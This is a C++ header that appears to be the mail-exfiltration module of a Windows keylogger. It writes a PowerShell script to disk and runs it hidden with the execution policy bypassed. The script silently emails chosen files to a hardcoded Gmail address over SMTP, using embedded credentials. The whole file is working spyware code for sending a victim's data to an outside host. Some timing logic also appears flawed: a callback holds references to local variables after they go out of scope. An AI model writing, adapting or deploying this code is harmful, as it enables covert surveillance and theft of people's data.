#ifndef SEND_MAIL_H
#define SEND_MAIL_H

#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

constexpr auto SCRIPT_NAME = "sm.ps1";

namespace Mail
{
    const std::string X_EM_TO = "Email to";
    const std::string X_EM_FROM = "Email from";
    const std::string X_EM_PASS = "Email from pass";

    const std::string& PowerShellScript =
        "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
        "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
        " {\r\n  Param (\r\n [Parameter(`\r\n  Mandatory=$true)]\r\n "
        "[String]$To,\r\n [Parameter(`\r\n Mandatory=$true)]\r\n "
        "[String]$From,\r\n  [Parameter(`\r\n  mandatory=$true)]\r\n "
        "[String]$Password,\r\n [Parameter(`\r\n Mandatory=$true)]\r\n "
        "[String]$Subject,\r\n [Parameter(`\r\n Mandatory=$true)]\r\n "
        "[String]$Body,\r\n  [Parameter(`\r\n Mandatory=$true)]\r\n "
        "[String]$attachment\r\n  )\r\n  try\r\n  {\r\n"
        "$Encode = [Text.Encoding]::GetEncoding(\"utf-8\") \r\n   "
        "$Msg = New-Object System.Net.Mail.MailMessage \r\n "
        "$Msg.From = $From \r\n $Msg.To.Add($To) \r\n $Msg.Subject = $Subject \r\n "
        "$View = [Net.Mail.AlternateView]::CreateAlternateViewFromString($Body, $Encode, [Net.Mime.MediaTypeNames]::Text.Plain) \r\n "
        "$Msg.BodyEncoding = [System.Text.Encoding]::UTF8 \r\n $Msg.SubjectEncoding = [System.Text.Encoding]::UTF8 \r\n"
        "$View.TransferEncoding = [Net.Mime.TransferEncoding]::SevenBit \r\n $Msg.AlternateViews.Add($View) \r\n "
        "$Srv = \"smtp.gmail.com\"\r\n   if ($attachment -ne $null) {\r\ntry\r\n {\r\n"
        "$Attachments = $attachment -split (\"\\:\\:\");\r\n "
        "ForEach ($val in $Attachments)\r\n "
        "{\r\n $attch = New-Object System.Net.Mail.Attachment($val)\r\n "
        "$Msg.Attachments.Add($attch)\r\n }\r\n "
        "}\r\n  catch\r\n {\r\n exit 2; \r\n }\r\n  }\r\n "
        "$Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
        "$Client.EnableSsl = $true \r\n  $Client.Credentials = New-Object "
        "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n $Client.Send($Msg)\r\n "
        "Remove-Variable -Name Client\r\n  Remove-Variable -Name Password\r\n $Msg.Dispose()\r\n "
        "exit 7; \r\n }\r\n catch\r\n  {\r\n exit 3; "
        "\r\n }\r\n} #End Function Send-EMail\r\ntry\r\n  {\r\n  "
        "Send-EMail -attachment $Att "
        "-To \"" + X_EM_TO + "\""
        " -Body $Body -Subject $Subj "
        "-password \"" + X_EM_PASS + "\""
        " -From \"" + X_EM_FROM + "\"""\r\n  }\r\ncatch\r\n  {\r\n  exit 4; \r\n  }";

    std::string StringReplace(std::string s, const std::string& what, const std::string& with)
    {
        if (what.empty())
            return s;

        size_t sp = 0;

        while ((sp = s.find(what, sp)) != std::string::npos)
        {
            s.replace(sp, what.length(), with);
            sp += with.length();
        }
        return s;
    }

    bool CheckFileExists(const std::string& f)
    {
        std::ifstream file{ f };
        return static_cast<bool>(file);
    }

    bool CreateScript()
    {
        std::ofstream script{ IO::GetOurPath(true) + SCRIPT_NAME };

        if (!script)
            return false;

        script << PowerShellScript;

        if (!script)
            return false;

        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const std::string& subject, const std::string& body, const std::string& attachments)
    {
        bool ok;

        ok = IO::MKDir(IO::GetOurPath(true));
        if (!ok)
            return -1;

        std::string scr_path{ IO::GetOurPath(true) + SCRIPT_NAME };
        
        if (!CheckFileExists(scr_path))
            ok = CreateScript();

        if (!ok)
            return -2;

        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + 
                            "\" -Subj \"" + StringReplace(subject, "\"", "\\\"") + 
                            "\" -Body \"" + StringReplace(body, "\"", "\\\"") + 
                            "\" -Att \""  + attachments + "\"";
        std::wstring w_param = std::wstring(param.begin(), param.end());

        SHELLEXECUTEINFO ShExecInfo{ 0 };
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = nullptr;
        ShExecInfo.lpVerb = L"open";
        ShExecInfo.lpFile = L"powershell";
        ShExecInfo.lpParameters = w_param.c_str();
        ShExecInfo.lpDirectory = nullptr;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = nullptr;

        ok = static_cast<bool>(ShellExecuteEx(&ShExecInfo));
        if (!ok)
            return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        int i_exit_code = static_cast<int>(exit_code);
        m_timer.SetFunction([&]() 
            {
                WaitForSingleObject(ShExecInfo.hProcess, 60000);
                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
                
                if (i_exit_code == STILL_ACTIVE)
                    TerminateProcess(ShExecInfo.hProcess, 100);

                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString(i_exit_code));
            }
        );

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);

        return i_exit_code;
    }

    int SendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& att)
    {
        std::string attachments{ "" };

        if (att.size() == 1U)
            attachments = att.at(0);
        else
        {
            for(const auto& v : att)
                attachments += v + "::";

            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return SendMail(subject, body, attachments);
    }

}

#endif // !SEND_MAIL_H
